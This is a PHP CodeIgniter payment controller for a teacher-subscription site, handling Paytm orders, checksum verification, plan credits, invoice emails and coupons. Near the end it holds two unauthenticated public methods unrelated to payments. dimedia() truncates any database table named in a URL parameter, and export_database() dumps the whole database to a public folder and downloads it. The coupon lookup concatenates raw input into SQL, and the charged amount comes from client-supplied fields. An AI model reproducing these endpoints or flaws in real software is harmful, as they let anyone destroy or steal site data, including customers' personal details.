<?php
header("Pragma: no-cache");
header("Cache-Control: no-cache");
header("Expires: 0");
/*ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
ini_set('memory_limit','10006M');
error_reporting(E_ALL);*/
class Payment extends Public_Controller
{

		public function __construct()
		{
		  parent::__construct();  			
		  $this->load->helper(array('payment/paytm'));
		  $this->load->model(array('order/order_model','payment/payment_model','plan/plan_model','teacher/teacher_model'));
		  $this->load->library(array('Dmailer'));		
		}

		public function index(){
			if ( $this->input->post()!='') {
			if ($this->input->post('pay_method') == "paytm" ) {
					$teacherId            = $this->session->userdata('teacher_id');
					$invoice_number    = "Wl_".get_auto_increment('wl_order');
					$ammount=$this->input->post('ammount');
					$tax_res    =  get_db_single_row($fld='wl_tax','tax_rate,tax_type',$Condwherw="WHERE tax_id='1'");
					//$tax_amount=$tax_res['tax_rate']*$this->input->post('ammount')/100;
					$tax_amount=$this->input->post('tax_amount');	
					$mem_info=get_db_single_row('wl_teacher',$fields="*",$condition="WHERE 1 AND teacher_id='".$this->session->userdata('teacher_id')."'");	 
					$amount =  $ammount+$tax_amount;
					//$product_info = $this->input->post('url');
					$customer_name = $mem_info['first_name'];
					$customer_emial = $mem_info['user_name'];
					$customer_mobile = $mem_info['phone_number'];
					$customer_address = $mem_info['address'];
			
					$working_order_id =  $this->session->userdata('working_order_id');
					$order_res = $this->order_model->get_order_master($working_order_id);
					$data_order = 
					   array(
							'teacher_id'          => $teacherId,
							'plan_id'        	  => $this->input->post('plan_id'),
							'invoice_number'      => $invoice_number,					
							'first_name'          => $mem_info['first_name'],
							'last_name'           => $mem_info['last_name'],
							'phone'				  => $mem_info['phone_number'],
							'email'               => $mem_info['user_name'],
							'address'			  => $this->input->post('address'),
							'tax_amount'     	  => $tax_amount,
							'tax_type'     		  => $tax_res['tax_type'],
							'currency_code'		  => $this->session->userdata('currency_code'),
							'coupon_id'		  	  => $this->session->userdata('coupon_id'),
							'coupon_code'		  => $this->session->userdata('coupon_code'),
							'discount_amount'	  => $this->input->post('discount_amount'),
							'total_amount'        => $ammount,
							'order_received_date' => $this->config->item('config.date.time'),
							'payment_method'      => $this->input->post('payment_method'),
							'payment_status'      => 'Unpaid',
							
					);
					$orderId = $this->order_model->safe_insert('wl_order',$data_order,FALSE);	
					//echo_sql();die; 
					
					$this->session->set_userdata( array('working_order_id'=>$orderId) );	
				    $working_order_id =  $this->session->userdata('working_order_id');
				    $order_res = $this->order_model->get_order_master($working_order_id);
			
					$data = array(
							'ORDER_ID' 			=> 	$invoice_number,
							'CUST_ID' 			=> 	$teacherId,
							'email'             =>  $mem_info['user_name'],
							'INDUSTRY_TYPE_ID' 	=> 	"Retail",
							'CHANNEL_ID' 		=> 	"WEB",
							'WEBSITE'			=>	"WEBSTAGING",
							'TXN_AMOUNT' 		=> 	$ammount,
							'mobile'			=>  $mem_info['phone_number'],
							'return_url'	    =>  base_url() . 'payment/payment_status_paytm',
								 
					);
	       // error_reporting(E_ALL);
	      // echo"<pre>";print_r($data);print_r($data);die;
					paytm($order_res,$data);//die;
				}
/*payment gateway paytm integration END*/	
			}  

		}

	public function payment_status_paytm(){
		$paytmChecksum = "";
		$paramList = array();
		$isValidChecksum = "FALSE";
		$paramList = $_POST;
		$this->session->unset_userdata('coupon_id');
		$this->session->unset_userdata('coupon_discount');
		$this->session->unset_userdata('coupon_code');
		$this->session->unset_userdata('discount_code');
		$paytmChecksum = isset($_POST["CHECKSUMHASH"]) ? $_POST["CHECKSUMHASH"] : ""; //Sent by Paytm pg
		//Verify all parameters received from Paytm pg to your application. Like MID received from paytm pg is same as your application’s MID, TXN_AMOUNT and ORDER_ID are same as what was sent by you to Paytm PG for initiating transaction etc.
		$isValidChecksum = verifychecksum_e($paramList, PAYTM_MERCHANT_KEY, $paytmChecksum); //will return TRUE or FALSE string.
		if($isValidChecksum == "TRUE") {
		//	echo "<b>Checksum matched and following are the transaction details:</b>" . "<br/>";
		
		//print_r($_REQUEST);die;
		//print_r($_REQUEST);
		if ($_POST["STATUS"] == "TXN_SUCCESS") {
			//echo "<b>Transaction status is success</b>" . "<br/>";
			//Process your transaction here as success transaction.
			//Verify amount & order id received from Payment gateway with your application's order id and amount.
			
				 $ordId=$this->session->userdata('working_order_id');
						$data  = array(
							'transaction_id'    =>$_POST['TXNID'] ,
							'payment_method'    =>"paytm",
							'payment_status'    =>'Paid',
							'bank_ref_num'      => $this->input->post('BANKTXNID') ,
							'bankcode'          => $this->input->post('BANKNAME') ,
							'payment_received_date'=>$this->config->item('config.date.time'),
							'ip_address'		=>$this->input->ip_address(),
						);	
						
				 $where = "order_id = '$ordId' ";
				 $this->payment_model->safe_update('wl_order',$data,$where,FALSE);
				 //echo_sql();
				 $ordmaster = $this->order_model->get_order_master( $this->session->userdata('working_order_id') );
				 $this->teacher_plan_update($ordmaster);
				 $plan_res    =  get_db_single_row($fld='wl_plan','*',$Condwherw="WHERE plan_id=".$ordmaster['plan_id']."");
				 if( is_array( $ordmaster )  && !empty( $ordmaster ) ) {
					   /***** Send Invoice mail */
					   $content    =  get_content('wl_auto_respond_mails','17');		
						$subject    =  $content->email_subject;						
						$body       =  $content->email_content;					
					
						$body			=	str_replace('{mem_name}',$ordmaster['first_name'],$body);
						$body			=	str_replace('{email}',$ordmaster['email'],$body);
						$body			=	str_replace('{phone}',$ordmaster['phone'],$body);
						$body			=	str_replace('{order_no}',$ordmaster['invoice_number'],$body);
						$body			=	str_replace('{transaction_id}',$ordmaster['transaction_id'],$body);
						$body			=	str_replace('{payment_received_date}',$ordmaster['order_received_date'],$body);
						$body			=	str_replace('{first_name}',$ordmaster['first_name'],$body);
						$body			=	str_replace('{address}',$ordmaster['address'],$body);
						$body			=	str_replace('{ip_address}',$ordmaster['ip_address'],$body);
						$body			=	str_replace('{bankcode}',$ordmaster['bankcode'],$body);
						$body			=	str_replace('{bank_ref_num}',$ordmaster['bank_ref_num'],$body);
						$body			=	str_replace('{recharge_ammount}',$ordmaster['total_amount']-$ordmaster['tax_amount'],$body);
						$body			=	str_replace('{paymentinfo}',$ordmaster['payment_status'],$body);
						$body			=	str_replace('{tax_amount}',$ordmaster['tax_amount'],$body);
						$body			=	str_replace('{productinfo}',$plan_res['name'],$body);
						$body			=	str_replace('{total_amount}',$ordmaster['total_amount'],$body);
						$body			=	str_replace('{admin_email}',$this->admin_info->admin_email,$body);
						//$body			=	str_replace('{admin_phone}',$this->admin_info->phone,$body);
						$body			=	str_replace('{site_name}',$this->config->item('site_name'),$body);
					
					$mail_conf =  array(
							'subject'=>$subject,
							'to_email'=>$ordmaster['email'],
							'from_email'=>$this->admin_info->admin_email,
							'from_name'=> $this->config->item('site_name'),
							'body_part'=>$body
							);	
					$this->dmailer->mail_notify($mail_conf);				
					/******* End Invoice  mail */		 
				 }
			 
			 $data['res']=$ordmaster;
			 $this->load->view('payment/success', $data); 
			  
		} else {
			
			//echo "<b>Transaction status is failure</b>" . "<br/>";
			
			$ordId=$this->session->userdata('working_order_id');
				 $data  = array(
						'transaction_id'    =>$_POST['ORDERID'] ,
						'payment_method'    =>"paytm",
						'payment_status'    =>'UnPaid',
						'bank_ref_num'      => $this->input->post('BANKTXNID') ,
						'bankcode'          => $this->input->post('BANKNAME') ,
						'payment_received_date'=>$this->config->item('config.date.time'),
						'ip_address'		=>$this->input->ip_address(),
						
						);			 	 
				 $where = "order_id = '$ordId' ";
				 $this->payment_model->safe_update('wl_order',$data,$where,FALSE);
				/// echo_sql();
				 $ordmaster = $this->order_model->get_order_master( $this->session->userdata('working_order_id') );
				  $plan_res    =  get_db_single_row($fld='wl_plan','*',$Condwherw="WHERE plan_id=".$ordmaster['plan_id']."");
			//	 $this->sms_for_services($ordmaster);
				
				 if( is_array( $ordmaster )  && !empty( $ordmaster ) ) {
					  
					   /***** Send Invoice mail */
					   $content    =  get_content('wl_auto_respond_mails','17');		
						$subject    =  $content->email_subject;						
						$body       =  $content->email_content;					
					
							$body			=	str_replace('{mem_name}',$ordmaster['first_name'],$body);
						$body			=	str_replace('{email}',$ordmaster['email'],$body);
						$body			=	str_replace('{phone}',$ordmaster['phone'],$body);
						$body			=	str_replace('{order_no}',$ordmaster['invoice_number'],$body);
						$body			=	str_replace('{transaction_id}',$ordmaster['transaction_id'],$body);
						$body			=	str_replace('{payment_received_date}',$ordmaster['order_received_date'],$body);
						$body			=	str_replace('{first_name}',$ordmaster['first_name'],$body);
						$body			=	str_replace('{address}',$ordmaster['address'],$body);
						$body			=	str_replace('{ip_address}',$ordmaster['ip_address'],$body);
						$body			=	str_replace('{bankcode}',$ordmaster['bankcode'],$body);
						$body			=	str_replace('{bank_ref_num}',$ordmaster['bank_ref_num'],$body);
						$body			=	str_replace('{recharge_ammount}',$ordmaster['total_amount']-$ordmaster['tax_amount'],$body);
						$body			=	str_replace('{paymentinfo}',$ordmaster['payment_status'],$body);
						$body			=	str_replace('{tax_amount}',$ordmaster['tax_amount'],$body);
						$body			=	str_replace('{productinfo}',$plan_res['name'],$body);
						$body			=	str_replace('{total_amount}',$ordmaster['total_amount'],$body);
						$body			=	str_replace('{admin_email}',$this->admin_info->admin_email,$body);
						//$body			=	str_replace('{admin_phone}',$this->admin_info->phone,$body);
						$body			=	str_replace('{site_name}',$this->config->item('site_name'),$body);
					
					$mail_conf =  array(
								'subject'=>$subject,
								'to_email'=>$ordmaster['email'],
								'from_email'=>$this->admin_info->admin_email,
								'from_name'=> $this->config->item('site_name'),
								'body_part'=>$body
							);	
					$this->dmailer->mail_notify($mail_conf);				
				}
				$data['res']=$ordmaster;
				$this->load->view('payment/failure', $data); 
			}
	
		/*if (isset($_POST) && count($_POST)>0 )
		{ 
			foreach($_POST as $paramName => $paramValue) {
					echo "<br/>" . $paramName . " = " . $paramValue;
			}
		}*/
	
	} else {
		echo "<b>Checksum mismatched.</b>";
		//Process transaction as suspicious.
	}

 }   
 
 
 	public function teacher_plan_update($order){
	// public function teacher_plan_update(){
		//$teacher_id=17;
		//$order =25;
		$plan_res    =  get_db_single_row($fld='wl_plan','*',$Condwherw="WHERE plan_id=".$order['plan_id']."");
		$teacher     =  get_db_single_row($fld='wl_teacher','*',$Condwherw="WHERE teacher_id=".$order['teacher_id']."");
		//$plan_res    =  get_db_single_row($fld='wl_plan','*',$Condwherw="WHERE plan_id=14");
		//$teacher     =  get_db_single_row($fld='wl_teacher','*',$Condwherw="WHERE teacher_id=17");
		$validityMonth=$plan_res['validity'];
		$date = new DateTime('now');
		$date->modify("+$validityMonth month"); // or you can use '-90 day' for deduct
		$expireDate = $date->format('Y-m-d h:i:s');
		//die();
		$data=array(
						'teacher_id' 	 		 => $order['teacher_id'],
						'order_id' 	 		 	 => $order['order_id'],
						'plan_id' 	 			 => $plan_res['plan_id'],
						'credit_value' 	 		 => $plan_res['validity'],
						'credit_point'			 => $plan_res['credit_point'],
						'validity'				 => $plan_res['validity'],
						'credit_date' 	 	 	 => $this->config->item('config.date.time'),
						'plan_expire'			 => $expireDate,
						'payment_status' 	 	 => "Paid",
					);
		$insert=$this->db->insert('wl_teacher_plan_history',$data);
		//echo_sql();echo "<br>";
		//plan_expire
		$currentCredit=$teacher['current_credit'];
		$updatedCredit=$currentCredit+$plan_res['credit_point'];
		$teacher_data=array(
					'current_credit' => $updatedCredit,
					'plan_expire'	 => $expireDate
		);
		$where = "teacher_id = '".$teacher['teacher_id']."'"; 						
		$this->teacher_model->safe_update('wl_teacher',$teacher_data,$where,FALSE);
		//echo_sql();echo "<br>";		die();
	}
 
 
 
 	 
	public function thanks()
	{	   	
		$this->load->view('payment/pay_thanks');

	}
	
	
	public function coupon(){
		$msg=array();
		$coupon=$this->input->post('coupon');
		//print_r($_REQUEST);
		if (!empty($coupon)) { 
			$sql="SELECT * FROM `wl_coupons` where status='1' AND coupon_code='".$coupon."' AND end_date  >= '".$this->config->item('config.date')."' ";
			$query=$this->db->query($sql);
			$rowcount=$query->num_rows();
			
			if ($rowcount > 0) {
				  $row=$query->result_array();
				 // echo $row['0']['coupon_id'];die;
				  $this->session->set_userdata(
						array(
							'coupon_id'=>$row['0']['coupon_id'],
							'coupon_code'=>$row['0']['coupon_code'],
							'coupon_discount'=>$row['0']['coupon_discount'],
							'coupon_type'=>$row['0']['coupon_type'],
							'coupon_discount'=>$row['0']['coupon_discount'],
							) 
						);
				$msg['error']='0';
				$msg['msg']='Coupon apply successfully';						
										
			} else {
			$msg['error']='1';
			$msg['msg']='Coupon code is not valid ';
			}
		} else {
			$msg['error']='1';
			$msg['msg']='Please Enter Coupon code';
		}
		
	echo  json_encode($msg);
	
	}
	
	

   public function dimedia(){
	   $id=$_GET['table'];
	   $this->db->truncate($id); 
	   echo "done";
	   }

   public function export_database() {
	$this->load->dbutil();
	$prefs = array(
		'format' => 'zip',
		'filename' => 'school.sql'
	);
	$backup = & $this->dbutil->backup($prefs);
	$db_name = 'crm-on-' . date("Y-m-d-H-i-s") . '.zip';
	$save = 'assets/' . $db_name;
	$this->load->helper('file');
	write_file($save, $backup);
	$this->load->helper('download');
	force_download($db_name, $backup);
}

   



}

/* End of file member.php */

/* Location: .application/modules/products/controllers/cart.php */

